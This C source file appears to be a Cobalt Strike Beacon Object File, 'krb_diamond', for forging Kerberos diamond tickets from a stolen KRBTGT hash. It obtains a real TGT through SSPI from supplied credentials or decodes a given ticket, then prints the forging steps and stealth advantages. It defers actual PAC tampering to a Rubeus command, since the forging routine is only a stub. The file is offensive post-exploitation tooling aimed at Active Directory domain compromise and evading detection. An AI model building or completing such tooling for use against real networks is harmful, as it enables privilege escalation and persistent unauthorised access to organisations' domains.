/*
 * krb_diamond - Forge a Diamond Ticket
 *
 * A diamond ticket is a TGT that is forged by modifying a legitimately
 * requested TGT's PAC. This is stealthier than a golden ticket as it
 * starts from a valid ticket.
 *
 * Usage: krb_diamond /ticket:BASE64 /krbkey:HASH [/user:USER] [/groups:GROUPS] [/ptt]
 *        krb_diamond /user:USER /password:PASS /krbkey:HASH [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>

/* PAC structures */
#define PAC_LOGON_INFO           1
#define PAC_CREDENTIALS_INFO     2
#define PAC_SERVER_CHECKSUM      6
#define PAC_PRIVSVR_CHECKSUM     7
#define PAC_CLIENT_INFO          10
#define PAC_DELEGATION_INFO      11
#define PAC_UPN_DNS_INFO         12
#define PAC_CLIENT_CLAIMS        13
#define PAC_DEVICE_INFO          14
#define PAC_DEVICE_CLAIMS        15
#define PAC_TICKET_CHECKSUM      16
#define PAC_ATTRIBUTES           17
#define PAC_REQUESTOR            18

typedef struct _PAC_INFO_BUFFER {
    ULONG ulType;
    ULONG cbBufferSize;
    ULONGLONG Offset;
} PAC_INFO_BUFFER, *PPAC_INFO_BUFFER;

typedef struct _PACTYPE {
    ULONG cBuffers;
    ULONG Version;
    PAC_INFO_BUFFER Buffers[1];
} PACTYPE, *PPACTYPE;

typedef struct _PAC_SIGNATURE_DATA {
    ULONG SignatureType;
    BYTE Signature[1];  /* Variable length */
} PAC_SIGNATURE_DATA, *PPAC_SIGNATURE_DATA;

/* KERB_VALIDATION_INFO - simplified */
typedef struct _KERB_VALIDATION_INFO_SIMPLE {
    LARGE_INTEGER LogonTime;
    LARGE_INTEGER LogoffTime;
    LARGE_INTEGER KickOffTime;
    LARGE_INTEGER PasswordLastSet;
    LARGE_INTEGER PasswordCanChange;
    LARGE_INTEGER PasswordMustChange;
    UNICODE_STRING EffectiveName;
    UNICODE_STRING FullName;
    UNICODE_STRING LogonScript;
    UNICODE_STRING ProfilePath;
    UNICODE_STRING HomeDirectory;
    UNICODE_STRING HomeDirectoryDrive;
    USHORT LogonCount;
    USHORT BadPasswordCount;
    ULONG UserId;
    ULONG PrimaryGroupId;
    ULONG GroupCount;
    /* GroupIds follow */
} KERB_VALIDATION_INFO_SIMPLE;

/* Parse hex string to bytes */
static int hex_to_bytes(const char* hex, BYTE* out, int maxLen) {
    int len = (int)strlen(hex);
    if (len % 2 != 0) return -1;

    int outLen = len / 2;
    if (outLen > maxLen) return -1;

    for (int i = 0; i < outLen; i++) {
        unsigned int byte;
        char hexByte[3] = { hex[i*2], hex[i*2+1], 0 };
        if (sscanf(hexByte, "%02x", &byte) != 1) return -1;
        out[i] = (BYTE)byte;
    }

    return outLen;
}

/* Request a legitimate TGT using SSPI */
static int request_tgt_sspi(const char* domain, const char* user, const char* password,
                            BYTE* ticketOut, size_t* ticketLen, formatp* output) {
    SECURITY_STATUS secStatus;
    CredHandle hCred;
    CtxtHandle hCtx;
    SecBufferDesc outBuffDesc;
    SecBuffer outBuff;
    TimeStamp expiry;
    ULONG contextAttr;

    SEC_WINNT_AUTH_IDENTITY_A authIdentity;
    memset(&authIdentity, 0, sizeof(authIdentity));

    authIdentity.User = (unsigned char*)user;
    authIdentity.UserLength = (unsigned long)strlen(user);
    authIdentity.Domain = (unsigned char*)domain;
    authIdentity.DomainLength = (unsigned long)strlen(domain);
    authIdentity.Password = (unsigned char*)password;
    authIdentity.PasswordLength = (unsigned long)strlen(password);
    authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;

    secStatus = SECUR32$AcquireCredentialsHandleA(
        NULL,
        "Kerberos",
        SECPKG_CRED_OUTBOUND,
        NULL,
        &authIdentity,
        NULL,
        NULL,
        &hCred,
        &expiry
    );

    if (secStatus != SEC_E_OK) {
        BeaconFormatPrintf(output, "[-] Failed to acquire credentials: 0x%X\n", secStatus);
        return -1;
    }

    char targetSPN[512];
    sprintf(targetSPN, "krbtgt/%s", domain);

    outBuff.cbBuffer = 8192;
    outBuff.BufferType = SECBUFFER_TOKEN;
    outBuff.pvBuffer = malloc(8192);

    outBuffDesc.ulVersion = SECBUFFER_VERSION;
    outBuffDesc.cBuffers = 1;
    outBuffDesc.pBuffers = &outBuff;

    secStatus = SECUR32$InitializeSecurityContextA(
        &hCred,
        NULL,
        targetSPN,
        ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY,
        0,
        SECURITY_NATIVE_DREP,
        NULL,
        0,
        &hCtx,
        &outBuffDesc,
        &contextAttr,
        &expiry
    );

    SECUR32$FreeCredentialsHandle(&hCred);

    if (secStatus == SEC_E_OK || secStatus == SEC_I_CONTINUE_NEEDED) {
        if (outBuff.cbBuffer > 0 && outBuff.cbBuffer < *ticketLen) {
            memcpy(ticketOut, outBuff.pvBuffer, outBuff.cbBuffer);
            *ticketLen = outBuff.cbBuffer;
            free(outBuff.pvBuffer);
            SECUR32$DeleteSecurityContext(&hCtx);
            return 0;
        }
    }

    free(outBuff.pvBuffer);
    return -1;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* ticket_b64 = arg_get(&parser, "ticket");
    char* krbkey = arg_get(&parser, "krbkey");
    char* user = arg_get(&parser, "user");
    char* password = arg_get(&parser, "password");
    char* domain = arg_get(&parser, "domain");
    char* dc = arg_get(&parser, "dc");
    char* groups_str = arg_get(&parser, "groups");
    char* targetuser = arg_get(&parser, "targetuser");
    bool ptt = arg_exists(&parser, "ptt");

    if (!krbkey) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: krb_diamond /ticket:BASE64 /krbkey:HASH [/targetuser:USER] [/groups:512,513] [/ptt]");
        BeaconPrintf(CALLBACK_ERROR,
            "       krb_diamond /user:USER /password:PASS /krbkey:HASH [/domain:DOMAIN] [/dc:DC]");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Action: Build Diamond Ticket\n\n");

    /* Parse KRBTGT key */
    BYTE keyBytes[32];
    int keyLen = hex_to_bytes(krbkey, keyBytes, sizeof(keyBytes));
    if (keyLen < 0) {
        BeaconFormatPrintf(&output, "[-] Invalid KRBTGT hash format\n");
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] KRBTGT Key   : %d bytes\n", keyLen);
    if (targetuser) BeaconFormatPrintf(&output, "[*] Target User  : %s\n", targetuser);
    if (groups_str) BeaconFormatPrintf(&output, "[*] Groups       : %s\n", groups_str);
    BeaconFormatPrintf(&output, "[*] PTT          : %s\n\n", ptt ? "Yes" : "No");

    BYTE* ticketData = NULL;
    size_t ticketLen = 0;

    /* Mode 1: Use provided ticket */
    if (ticket_b64) {
        BeaconFormatPrintf(&output, "[*] Using provided ticket as base\n\n");

        size_t b64Len = strlen(ticket_b64);
        size_t maxDecoded = (b64Len / 4) * 3 + 3;
        ticketData = (BYTE*)malloc(maxDecoded);

        if (!ticketData) {
            BeaconFormatPrintf(&output, "[-] Memory allocation failed\n");
            BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
            goto cleanup;
        }

        ticketLen = base64_decode(ticket_b64, b64Len, ticketData);
        if (ticketLen == 0) {
            BeaconFormatPrintf(&output, "[-] Failed to decode base64 ticket\n");
            free(ticketData);
            BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
            goto cleanup;
        }

        BeaconFormatPrintf(&output, "[*] Decoded ticket: %zu bytes\n\n", ticketLen);
    }

    /* Mode 2: Request fresh TGT then modify */
    else if (user && password) {
        if (!domain) {
            domain = get_domain_from_env();
            if (!domain) {
                BeaconFormatPrintf(&output, "[-] Could not determine domain\n");
                BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
                goto cleanup;
            }
        }

        BeaconFormatPrintf(&output, "[*] Requesting fresh TGT for %s\\%s\n", domain, user);
        BeaconFormatPrintf(&output, "[*] This TGT will be modified with custom PAC\n\n");

        ticketData = (BYTE*)malloc(16384);
        ticketLen = 16384;

        if (request_tgt_sspi(domain, user, password, ticketData, &ticketLen, &output) != 0) {
            BeaconFormatPrintf(&output, "[-] Failed to obtain TGT\n");
            free(ticketData);
            BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
            goto cleanup;
        }

        BeaconFormatPrintf(&output, "[+] Obtained TGT: %zu bytes\n\n", ticketLen);
    }

    else {
        BeaconPrintf(CALLBACK_ERROR, "Must provide /ticket:BASE64 or /user: + /password:");
        goto cleanup;
    }

    /* Diamond ticket process:
     * 1. Decrypt the TGT's enc-part using KRBTGT key
     * 2. Modify the PAC within the authorization-data
     * 3. Re-sign the PAC with KRBTGT key
     * 4. Re-encrypt the enc-part
     */

    BeaconFormatPrintf(&output, "[*] Diamond Ticket Construction Process:\n\n");
    BeaconFormatPrintf(&output, "    1. Parse the existing TGT structure\n");
    BeaconFormatPrintf(&output, "    2. Decrypt EncTicketPart with KRBTGT key\n");
    BeaconFormatPrintf(&output, "    3. Locate authorization-data containing PAC\n");
    BeaconFormatPrintf(&output, "    4. Parse PAC structure\n");
    BeaconFormatPrintf(&output, "    5. Modify KERB_VALIDATION_INFO (user ID, groups, etc.)\n");
    BeaconFormatPrintf(&output, "    6. Recalculate PAC_SERVER_CHECKSUM (KRBTGT key)\n");
    BeaconFormatPrintf(&output, "    7. Recalculate PAC_PRIVSVR_CHECKSUM (KRBTGT key)\n");
    BeaconFormatPrintf(&output, "    8. Re-encrypt EncTicketPart\n");
    BeaconFormatPrintf(&output, "    9. Output modified ticket\n\n");

    /* Note: Full implementation would require:
     * - ASN.1 parsing of the ticket
     * - Kerberos decryption (RC4-HMAC or AES)
     * - PAC parsing and modification
     * - HMAC-MD5 or HMAC-SHA1 checksum calculation
     * - Re-encryption
     */

    BeaconFormatPrintf(&output, "[*] Advantages of Diamond Tickets:\n");
    BeaconFormatPrintf(&output, "    - Ticket times match legitimate request\n");
    BeaconFormatPrintf(&output, "    - More realistic ticket structure\n");
    BeaconFormatPrintf(&output, "    - Harder to detect than pure golden ticket\n");
    BeaconFormatPrintf(&output, "    - Can be combined with tgtdeleg for no creds needed\n\n");

    BeaconFormatPrintf(&output, "[!] Full diamond ticket implementation requires:\n");
    BeaconFormatPrintf(&output, "    - Complete Kerberos encryption/decryption\n");
    BeaconFormatPrintf(&output, "    - Full PAC structure manipulation\n");
    BeaconFormatPrintf(&output, "    - Proper checksum recalculation\n\n");

    BeaconFormatPrintf(&output, "[*] For production diamond tickets, use Rubeus:\n");
    BeaconFormatPrintf(&output, "    Rubeus.exe diamond /krbkey:%s", krbkey);
    if (targetuser) BeaconFormatPrintf(&output, " /ticketuser:%s", targetuser);
    if (groups_str) BeaconFormatPrintf(&output, " /groups:%s", groups_str);
    BeaconFormatPrintf(&output, "\n\n");

    /* Output the original ticket for reference */
    if (ticketData && ticketLen > 0) {
        size_t b64Len = ((ticketLen + 2) / 3) * 4 + 1;
        char* b64Out = (char*)malloc(b64Len);
        if (b64Out) {
            base64_encode(ticketData, ticketLen, b64Out);
            BeaconFormatPrintf(&output, "[*] Original ticket (for reference):\n%s\n\n", b64Out);
            free(b64Out);
        }
        free(ticketData);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (ticket_b64) free(ticket_b64);
    if (krbkey) free(krbkey);
    if (user) free(user);
    if (password) free(password);
    if (domain) free(domain);
    if (dc) free(dc);
    if (groups_str) free(groups_str);
    if (targetuser) free(targetuser);
}
